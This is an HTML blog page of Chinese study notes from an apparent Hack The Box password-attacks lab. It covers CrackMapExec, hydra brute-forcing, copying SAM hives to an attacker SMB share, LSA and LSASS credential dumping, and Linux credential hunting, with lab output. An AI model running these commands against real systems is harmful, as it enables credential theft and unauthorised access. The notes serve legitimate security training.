@@ -1,0 +1,654 @@
+
+<!DOCTYPE html>
+<html lang="en ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Salve || Passwrod_Attack</title>
+    <meta name="author" content="TiAmo">
+    <meta name="description" content="Buona notte ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/avatar.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Salve</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+        <a href="">
+            <span>
+                <a-icon type="compass" theme="filled" />
+            </span>
+            <span>英文博客</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Salve</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+            <a href="">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="compass" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">英文博客</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>Passwrod_Attack </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/7/20
+        </span>
+
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/base" style=color:#ffa2c4>
+                    base
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <p>在我们的渗透测试中，我们遇到的每一个计算机网络都将安装用于管理、编辑或创建内容的服务。所有这些服务都使用特定的权限托管，并分配给特定的用户</p>
+<span id="more"></span>
+
+<h4 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h4><p>这里引入了一个新工具攻击各种基于windows的协议：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$  crackmapexec -h
+
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -t THREADS            set how many concurrent threads to use (default: 100)
+  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)
+  --jitter INTERVAL     sets a random delay between each connection (default: None)
+  --darrell             give Darrell a hand
+  --verbose             enable verbose output
+
+protocols:
+  available protocols
+
+  &#123;mssql,smb,ssh,winrm&#125;
+    mssql               own stuff using MSSQL
+    smb                 own stuff using SMB
+    ssh                 own stuff using SSH
+    winrm               own stuff using WINRM
+</code></pre>
+<p>针对某种协议的用法：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb -h
+</code></pre>
+<p>通用的语法大致如下：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec &lt;proto&gt; &lt;target-IP&gt; -u &lt;user or userlist&gt; -p &lt;password or passwordlist&gt;
+</code></pre>
+<h4 id="Evil-WinRM"><a href="#Evil-WinRM" class="headerlink" title="Evil-WinRM"></a>Evil-WinRM</h4><p>这里还提到了一个专门针对WinRM的工具 <a target="_blank" rel="noopener" href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a></p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sudo gem install evil-winrm
+</code></pre>
+<p>基本用法：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ evil-winrm -i &lt;target-IP&gt; -u &lt;username&gt; -p &lt;password&gt;
+</code></pre>
+<p>直接上练习：</p>
+<h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><blockquote>
+<p>target:10.129.202.136</p>
+<ul>
+<li>查找WinRM服务的用户并破解其密码。然后，当您登录时，您会在那里的一个文件中找到该标志。提交您找到的标志作为答案。</li>
+<li>找到SSH服务的用户并破解他们的密码。然后，当您登录时，您会在那里的一个文件中找到该标志。提交您找到的标志作为答案。</li>
+<li>找到RDP服务的用户并破解他们的密码。然后，当您登录时，您会在那里的一个文件中找到该标志。提交您找到的标志作为答案。</li>
+<li>查找SMB服务的用户并破解他们的密码。然后，当您登录时，您会在那里的一个文件中找到该标志。提交您找到的标志作为答案。</li>
+</ul>
+</blockquote>
+<p>这里纯属爆破比较无聊，而且vpn比较慢，直接学下一节吧。</p>
+<h1 id="Password-Mutations"><a href="#Password-Mutations" class="headerlink" title="Password Mutations"></a>Password Mutations</h1><p>他给了一篇博客，是关于密码的<a target="_blank" rel="noopener" href="https://wpengine.com/resources/passwords-unmasked-infographic/">WPengine</a></p>
+<p>顺带再放一个hashcat的规则集方便查找：<a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">documentation</a></p>
+<h4 id="CeWL"><a href="#CeWL" class="headerlink" title="CeWL"></a><a target="_blank" rel="noopener" href="https://github.com/digininja/CeWL">CeWL</a></h4><p>我们现在可以使用另一个名为CeWL的工具来扫描公司网站上的潜在单词，并将其保存在单独的列表中。然后，我们可以将该列表与所需规则相结合，创建一个自定义的密码列表，该列表猜测正确密码的概率更高。我们指定了一些参数，如spider的深度（-d）、单词的最小长度（-m）、找到的单词的小写存储（–lower），以及我们想要存储结果的文件（-w）。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
+</code></pre>
+<h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><blockquote>
+<p>使用本节右上角“资源”下ZIP文件中的文件创建一个变异单词列表。使用此单词列表可以强制爆破用户“sam”的密码。成功后，使用SSH登录并提交flag.txt文件的内容作为您的答案。</p>
+</blockquote>
+<p>这里它给了一个文件里面有一个密码本和用户列表和一个规则集，上一题应该用这个文档能轻松爆破。。。</p>
+<p>这里要做什么也很清楚，但是发现hydra不能直接使用-r了：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307201825210.png" alt="image-20230720182512124"></p>
+<p>这里先用hashcat转换一下：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ hashcat --force password.list -r custom.rule --stdout | sort -u &gt; mut_password.list
+</code></pre>
+<blockquote>
+<ol>
+<li><code>hashcat</code>: 运行 Hashcat 密码破解工具。</li>
+<li><code>--force</code>: 强制进行破解，即忽略一些警告信息。</li>
+<li><code>password.list</code>: 这是包含要破解的密码列表的文件名，Hashcat 将从该文件中读取密码列表进行破解。</li>
+<li><code>-r custom.rule</code>: 使用规则文件 <code>custom.rule</code> 对密码进行变换。规则文件定义了一系列的字符串转换规则，Hashcat 将应用这些规则来生成多个变换后的密码，并将其用于破解尝试。</li>
+<li><code>--stdout</code>: 将生成的所有变换后的密码输出到标准输出（即屏幕），而不是进行实际的破解尝试。</li>
+<li><code>|</code>: 管道符号，将前面命令的输出作为后面命令的输入。</li>
+<li><code>sort -u</code>: 对密码进行排序并去除重复的密码。</li>
+<li><code>&gt; mut_password.list</code>: 将排序后去重的密码列表输出到名为 <code>mut_password.list</code> 的文件中。</li>
+</ol>
+</blockquote>
+<p>然后：</p>
+<pre><code>hydra -l sam -P mut_password.list  ssh://10.129.202.64
+</code></pre>
+<p>&#x3D;&#x3D;&gt;</p>
+<h1 id="Password-Reuse-x2F-Default-Passwords"><a href="#Password-Reuse-x2F-Default-Passwords" class="headerlink" title="Password Reuse &#x2F; Default Passwords"></a>Password Reuse &#x2F; Default Passwords</h1><h2 id="Credential-Stuffing"><a href="#Credential-Stuffing" class="headerlink" title="Credential Stuffing"></a>Credential Stuffing</h2><p>他给出了一个默认凭据表： <a target="_blank" rel="noopener" href="https://github.com/ihebski/DefaultCreds-cheat-sheet">DefaultCreds-Cheat-Sheet</a></p>
+<p>有时候由于接口服务等过多管理员选择复制粘贴默认密码而不是手动输入一个自定义密码</p>
+<p>也可以直接搜索有无默认凭据：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307201836635.png" alt="img"></p>
+<h1 id="Windows-Local-Password-Attacks"><a href="#Windows-Local-Password-Attacks" class="headerlink" title="Windows Local Password Attacks"></a>Windows Local Password Attacks</h1><h2 id="Attacking-SAM"><a href="#Attacking-SAM" class="headerlink" title="Attacking SAM"></a>Attacking SAM</h2><h4 id="Copying-SAM-Registry-Hives"><a href="#Copying-SAM-Registry-Hives" class="headerlink" title="Copying SAM Registry Hives"></a>Copying SAM Registry Hives</h4><p>如果我们在目标上有本地管理员访问权限，我们可以复制三个注册表配置单元；当我们开始倾倒和破解散列时，每一个都有特定的目的。以下是下表中每一项的简要说明：</p>
+<table>
+<thead>
+<tr>
+<th>Registry Hive</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>hklm\sam</code></td>
+<td>包含与本地帐户密码关联的哈希。我们需要散列，这样我们就可以破解它们，并以明文形式获得用户帐户密码。</td>
+</tr>
+<tr>
+<td><code>hklm\system</code></td>
+<td>包含用于加密SAM数据库的系统引导密钥。我们将需要引导密钥来解密SAM数据库。</td>
+</tr>
+<tr>
+<td><code>hklm\security</code></td>
+<td>包含域帐户的缓存凭据。我们可能会从加入域的Windows目标中受益。</td>
+</tr>
+</tbody></table>
+<h4 id="Using-reg-exe-save-to-Copy-Registry-Hives"><a href="#Using-reg-exe-save-to-Copy-Registry-Hives" class="headerlink" title="Using reg.exe save to Copy Registry Hives"></a>Using reg.exe save to Copy Registry Hives</h4><p>以管理员身份启动CMD将允许我们运行reg.exe来保存上述注册表配置单元的副本。请运行以下命令执行此操作：</p>
+<pre><code class="cmd-session">C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.save
+
+The operation completed successfully.
+
+C:\WINDOWS\system32&gt; reg.exe save hklm\system C:\system.save
+
+The operation completed successfully.
+
+C:\WINDOWS\system32&gt; reg.exe save hklm\security C:\security.save
+
+The operation completed successfully.
+</code></pre>
+<p>要创建共享，我们所要做的就是使用python运行smbserver.py-smb2support，给共享一个名称（CompData），并指定攻击主机上共享将存储配置单元副本的目录（&#x2F;home&#x2F;ltnob&#x2F;Documents）。要知道smb2support选项将确保支持较新版本的SMB。如果我们不使用此标志，从Windows目标连接到我们的攻击主机上托管的共享时将出现错误。较新版本的Windows默认不支持SMBv1，因为存在大量严重漏洞和公开漏洞。</p>
+<p>一旦共享在我们的攻击主机上运行，我们就可以在Windows目标上使用move命令将配置单元副本移动到共享。</p>
+<h4 id="Moving-Hive-Copies-to-Share"><a href="#Moving-Hive-Copies-to-Share" class="headerlink" title="Moving Hive Copies to Share"></a>Moving Hive Copies to Share</h4><pre><code class="cmd-session">C:\&gt; move sam.save \\10.10.15.16\CompData
+        1 file(s) moved.
+
+C:\&gt; move security.save \\10.10.15.16\CompData
+        1 file(s) moved.
+
+C:\&gt; move system.save \\10.10.15.16\CompData
+        1 file(s) moved.
+</code></pre>
+<h2 id="Dumping-Hashes-with-Impacket’s-secretsdump-py"><a href="#Dumping-Hashes-with-Impacket’s-secretsdump-py" class="headerlink" title="Dumping Hashes with Impacket’s secretsdump.py"></a>Dumping Hashes with Impacket’s secretsdump.py</h2><p>使用secretsdump.py是一个简单的过程。我们所要做的就是使用Python运行secretsdump.py，然后指定从目标主机检索到的每个配置单元文件。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+</code></pre>
+<h2 id="Remote-Dumping-amp-LSA-Secrets-Considerations"><a href="#Remote-Dumping-amp-LSA-Secrets-Considerations" class="headerlink" title="Remote Dumping &amp; LSA Secrets Considerations"></a>Remote Dumping &amp; LSA Secrets Considerations</h2><p>通过使用本地管理员权限访问凭据，我们也可以通过网络锁定LSA机密。这可以允许我们从正在运行的服务、计划任务或使用LSA机密存储密码的应用程序中提取凭据。</p>
+<h4 id="Dumping-LSA-Secrets-Remotely"><a href="#Dumping-LSA-Secrets-Remotely" class="headerlink" title="Dumping LSA Secrets Remotely"></a>Dumping LSA Secrets Remotely</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+
+SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
+SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
+SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
+SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
+SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
+dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
+SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
+SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
+</code></pre>
+<h4 id="Dumping-SAM-Remotely"><a href="#Dumping-SAM-Remotely" class="headerlink" title="Dumping SAM Remotely"></a>Dumping SAM Remotely</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
+</code></pre>
+<h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><blockquote>
+<p>应用本节中教授的概念，获取目标上ITbackdoor用户帐户的密码。提交明文密码作为答案。</p>
+<p>在目标上转储LSA机密并发现存储的凭据。提交用户名和密码作为答案。（格式：用户名：密码，区分大小写）</p>
+</blockquote>
+<h1 id="Attacking-LSASS"><a href="#Attacking-LSASS" class="headerlink" title="Attacking LSASS"></a>Attacking LSASS</h1><p>除了获得SAM数据库的副本以转储和破解哈希之外，我们还将受益于针对LSASS。如本模块的凭据存储部分所述，LSASS是一项关键服务，在所有Windows操作系统中的凭据管理和身份验证过程中发挥着核心作用。</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307201915415.png" alt="lsass Diagram"></p>
+<p>初次登录后，LSASS将： 在内存中本地缓存凭据 创建访问令牌 强制执行安全策略 写入Windows安全日志 让我们介绍一些可以用来转储LSASS内存和从运行Windows的目标中提取凭据的技术和工具。</p>
+<h2 id="Dumping-LSASS-Process-Memory"><a href="#Dumping-LSASS-Process-Memory" class="headerlink" title="Dumping LSASS Process Memory"></a>Dumping LSASS Process Memory</h2><p>与使用LSASS攻击SAM数据库的过程类似，我们最好首先通过生成内存转储来创建LSASS进程内存内容的副本。通过创建转储文件，我们可以使用攻击主机离线提取凭据。请记住，离线进行攻击使我们在攻击速度上具有更大的灵活性，并且在目标系统上花费的时间更少。我们可以使用无数种方法来创建内存转储。让我们介绍一下可以使用Windows内置工具执行的技术。</p>
+<h4 id="Task-Manager-Method"><a href="#Task-Manager-Method" class="headerlink" title="Task Manager Method"></a>Task Manager Method</h4><p>通过访问与目标的交互式图形会话，我们可以使用任务管理器创建内存转储。这就要求我们：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307201916966.png" alt="Task Manager Memory Dump"></p>
+<p>打开任务管理器&gt;选择进程选项卡&gt;查找并右键单击本地安全机构进程&gt;选择创建转储文件</p>
+<p>一个名为lsass.DMP的文件被创建并保存在：</p>
+<pre><code class="cmd-session">C:\Users\loggedonusersdirectory\AppData\Local\Temp
+</code></pre>
+<h4 id="Rundll32-exe-amp-Comsvcs-dll-Method"><a href="#Rundll32-exe-amp-Comsvcs-dll-Method" class="headerlink" title="Rundll32.exe &amp; Comsvcs.dll Method"></a>Rundll32.exe &amp; Comsvcs.dll Method</h4><p>任务管理器方法依赖于我们与目标进行基于GUI的交互式会话。我们可以使用另一种方法，通过名为 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32">rundll32.exe</a>的命令行实用程序转储LSASS进程内存。这种方法比任务管理器方法更快，也更灵活，因为我们可能只需访问命令行就可以在Windows主机上获得shell会话。需要注意的是，现代反病毒工具将这种方法识别为恶意活动。 在发出创建转储文件的命令之前，我们必须确定为lsass.exe分配了哪个进程ID（PID）。这可以通过cmd或PowerShell完成：</p>
+<h4 id="Finding-LSASS-PID-in-cmd"><a href="#Finding-LSASS-PID-in-cmd" class="headerlink" title="Finding LSASS PID in cmd"></a>Finding LSASS PID in cmd</h4><pre><code class="cmd-session">C:\Windows\system32&gt; tasklist /svc
+
+Image Name                     PID Services
+========================= ======== ============================================
+System Idle Process              0 N/A
+System                           4 N/A
+Registry                        96 N/A
+smss.exe                       344 N/A
+csrss.exe                      432 N/A
+wininit.exe                    508 N/A
+csrss.exe                      520 N/A
+winlogon.exe                   580 N/A
+services.exe                   652 N/A
+lsass.exe                      672 KeyIso, SamSs, VaultSvc
+</code></pre>
+<pre><code class="powershell-session">PS C:\Windows\system32&gt; Get-Process lsass
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+   1260      21     4948      15396       2.56    672   0 lsass
+</code></pre>
+<h4 id="Creating-lsass-dmp-using-PowerShell"><a href="#Creating-lsass-dmp-using-PowerShell" class="headerlink" title="Creating lsass.dmp using PowerShell"></a>Creating lsass.dmp using PowerShell</h4><pre><code class="powershell-session">PS C:\Windows\system32&gt; rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
+</code></pre>
+<h2 id="Using-Pypykatz-to-Extract-Credentials"><a href="#Using-Pypykatz-to-Extract-Credentials" class="headerlink" title="Using Pypykatz to Extract Credentials"></a>Using Pypykatz to Extract Credentials</h2><p> <a target="_blank" rel="noopener" href="https://github.com/skelsec/pypykatz">pypykatz</a></p>
+<p>该命令启动使用pypykatz来解析LSASS进程内存转储中隐藏的机密。我们在命令中使用lsa，因为LSASS是本地安全机构的子系统，然后我们将数据源指定为小型转储文件，按照存储在攻击主机上的转储文件的路径（&#x2F;home&#x2F;peter&#x2F;Documents&#x2F;lass.dmp）进行。Pypykatz解析转储文件并输出结果：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
+</code></pre>
+<p>一些有用的凭据：</p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package">MSV</a>是Windows中的一个身份验证包，LSA调用它来验证SAM数据库的登录尝试。Pypykatz提取了存储在LSASS进程内存中的与bob用户帐户的登录会话相关的SID、用户名、域，甚至NT&amp;SHA1密码哈希。这将在本节末尾介绍的我们进攻的最后阶段证明是有帮助的。</p>
+<p>WDIGEST是一种较旧的身份验证协议，默认情况下在Windows XP-Windows 8和Windows Server 2003-Windows Server 2012中启用。LSASS以明文形式缓存WDIGEST使用的凭据。这意味着，如果我们发现自己的目标是启用WDIGEST的Windows系统，我们很可能会看到明文形式的密码。现代Windows操作系统默认情况下已禁用WDIGEST。此外，需要注意的是，Microsoft发布了针对受此问题影响的系统的WDIGEST安全更新。我们可以在这里 <a target="_blank" rel="noopener" href="https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/">here</a>.研究安全更新的细节。</p>
+<p><a target="_blank" rel="noopener" href="https://web.mit.edu/kerberos/#what_is">Kerberos</a>是Active Directory在Windows域环境中使用的网络身份验证协议。域用户帐户在使用Active Directory进行身份验证时被授予票证。此票证用于允许用户访问网络上已被授予访问权限的共享资源，而无需每次键入凭据。LSASS缓存与Kerberos关联的密码、ekeys、票证和pin。可以从LSASS进程内存中提取这些，并使用它们访问加入同一域的其他系统。</p>
+<p>&#x3D;&#x3D;数据保护应用程序编程接口（<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection">DPAPI</a> ）是Windows操作系统中的一组API，用于在每个用户的基础上为Windows操作系统功能和各种第三方应用程序加密和解密DPAPI数据块。&#x3D;&#x3D;</p>
+<h1 id="Credential-Hunting-in-Linux"><a href="#Credential-Hunting-in-Linux" class="headerlink" title="Credential Hunting in Linux"></a>Credential Hunting in Linux</h1><h2 id="Files"><a href="#Files" class="headerlink" title="Files"></a>Files</h2><p>我们应该逐一查找、查找和检查几类文件。这些类别如下：</p>
+<table>
+<thead>
+<tr>
+<th>Configuration files</th>
+<th>Databases</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Scripts</td>
+<td>Cronjobs</td>
+<td>SSH keys</td>
+</tr>
+</tbody></table>
+<p>通常，配置文件标记有以下三个文件扩展名（.config、.conf、.cnf）。通过下面的方法，我们将看到我们的搜索减少到了这三个文件扩展名。</p>
+<pre><code class="shell-session">cry0l1t3@unixclient:~$ for l in $(echo &quot;.conf .config .cnf&quot;);do echo -e &quot;\nFile extension: &quot; $l; find / -name *$l 2&gt;/dev/null | grep -v &quot;lib\|fonts\|share\|core&quot; ;done
+</code></pre>
+<h4 id="Databases"><a href="#Databases" class="headerlink" title="Databases"></a>Databases</h4><pre><code class="shell-session">for l in $(echo &quot;.sql .db .*db .db*&quot;);do echo -e &quot;\nDB File extension: &quot; $l; find / -name *$l 2&gt;/dev/null | grep -v &quot;doc\|lib\|headers\|share\|man&quot;;done
+</code></pre>
+<h4 id="Scripts"><a href="#Scripts" class="headerlink" title="Scripts"></a>Scripts</h4><pre><code class="shell-session">cry0l1t3@unixclient:~$ for l in $(echo &quot;.py .pyc .pl .go .jar .c .sh&quot;);do echo -e &quot;\nFile extension: &quot; $l; find / -name *$l 2&gt;/dev/null | grep -v &quot;doc\|lib\|headers\|share&quot;;done
+</code></pre>
+<h4 id="SSH-Keys"><a href="#SSH-Keys" class="headerlink" title="SSH Keys"></a>SSH Keys</h4><p>SSH密钥可以被视为用于公钥身份验证机制的SSH协议的“访问卡”。为客户端生成一个文件（私钥），为服务器生成一个相应的文件（公钥）。然而，这些并不相同，因此知道公钥不足以找到私钥。公钥可以验证由专用SSH密钥生成的签名，从而能够自动登录到服务器。即使未经授权的人获得了公钥，也几乎不可能从中计算出匹配的私钥。当使用私钥SSH连接到服务器时，服务器会检查私钥是否有效，并让客户端相应登录。因此，通过SSH连接不再需要密码。 由于SSH密钥可以任意命名，因此我们无法在它们中搜索特定的名称。然而，它们的格式允许我们唯一地识别它们，因为无论是公钥还是私钥，都有唯一的第一行来区分它们。</p>
+<pre><code class="shell-session">grep -rnw &quot;PRIVATE KEY&quot; /home/* 2&gt;/dev/null | grep &quot;:1&quot;
+</code></pre>
+<blockquote>
+<ul>
+<li><code>-r</code>: 递归地搜索目录及其子目录下的文件。</li>
+<li><code>-n</code>: 显示匹配行及其行号。</li>
+<li><code>-w</code>: 仅匹配完整单词，而不是部分匹配。</li>
+<li><code>&quot;PRIVATE KEY&quot;</code>: 要搜索的文本模式，即我们要找到包含的字符串。</li>
+</ul>
+</blockquote>
+<h2 id="History"><a href="#History" class="headerlink" title="History"></a>History</h2><p>所有历史文件都提供了有关当前和过去&#x2F;历史过程的重要信息。我们对存储用户命令历史记录的文件和存储系统进程信息的日志感兴趣。 在使用Bash作为标准shell的Linux发行版上输入的命令的历史记录中，我们可以在.Bash_history中找到相关文件。然而，其他文件（如.bashrc或.Bash_profile）可能包含重要信息。 </p>
+<h4 id="Bash-History"><a href="#Bash-History" class="headerlink" title="Bash History"></a>Bash History</h4><pre><code class="shell-session">tail -n5 /home/*/.bash*
+</code></pre>
+<table>
+<thead>
+<tr>
+<th><strong>Log File</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/var/log/messages</code></td>
+<td>Generic system activity logs.</td>
+</tr>
+<tr>
+<td><code>/var/log/syslog</code></td>
+<td>Generic system activity logs.</td>
+</tr>
+<tr>
+<td><code>/var/log/auth.log</code></td>
+<td>(Debian) All authentication related logs.</td>
+</tr>
+<tr>
+<td><code>/var/log/secure</code></td>
+<td>(RedHat&#x2F;CentOS) All authentication related logs.</td>
+</tr>
+<tr>
+<td><code>/var/log/boot.log</code></td>
+<td>Booting information.</td>
+</tr>
+<tr>
+<td><code>/var/log/dmesg</code></td>
+<td>Hardware and drivers related information and logs.</td>
+</tr>
+<tr>
+<td><code>/var/log/kern.log</code></td>
+<td>Kernel related warnings, errors and logs.</td>
+</tr>
+<tr>
+<td><code>/var/log/faillog</code></td>
+<td>Failed login attempts.</td>
+</tr>
+<tr>
+<td><code>/var/log/cron</code></td>
+<td>Information related to cron jobs.</td>
+</tr>
+<tr>
+<td><code>/var/log/mail.log</code></td>
+<td>All mail server related logs.</td>
+</tr>
+<tr>
+<td><code>/var/log/httpd</code></td>
+<td>All Apache related logs.</td>
+</tr>
+<tr>
+<td><code>/var/log/mysqld.log</code></td>
+<td>All MySQL server related logs.</td>
+</tr>
+</tbody></table>
+<h2 id="Memory-and-Cache"><a href="#Memory-and-Cache" class="headerlink" title="Memory and Cache"></a>Memory and Cache</h2><p>有一个名为 <a target="_blank" rel="noopener" href="https://github.com/huntergregal/mimipenguin">mimipenguin</a>的工具可以使整个过程变得更容易。但是，此工具需要管理员&#x2F;root权限</p>
+<p>我们可以使用的一个更强大的工具是LaZagne</p>
+<h1 id="Passwd-Shadow-amp-Opasswd"><a href="#Passwd-Shadow-amp-Opasswd" class="headerlink" title="Passwd, Shadow &amp; Opasswd"></a>Passwd, Shadow &amp; Opasswd</h1><h4 id="Passwd-Format"><a href="#Passwd-Format" class="headerlink" title="Passwd Format"></a>Passwd Format</h4><table>
+<thead>
+<tr>
+<th><code>cry0l1t3</code></th>
+<th><code>:</code></th>
+<th><code>x</code></th>
+<th><code>:</code></th>
+<th><code>1000</code></th>
+<th><code>:</code></th>
+<th><code>1000</code></th>
+<th><code>:</code></th>
+<th><code>cry0l1t3,,,</code></th>
+<th><code>:</code></th>
+<th><code>/home/cry0l1t3</code></th>
+<th><code>:</code></th>
+<th><code>/bin/bash</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Login name</td>
+<td></td>
+<td>Password info</td>
+<td></td>
+<td>UID</td>
+<td></td>
+<td>GUID</td>
+<td></td>
+<td>Full name&#x2F;comments</td>
+<td></td>
+<td>Home directory</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
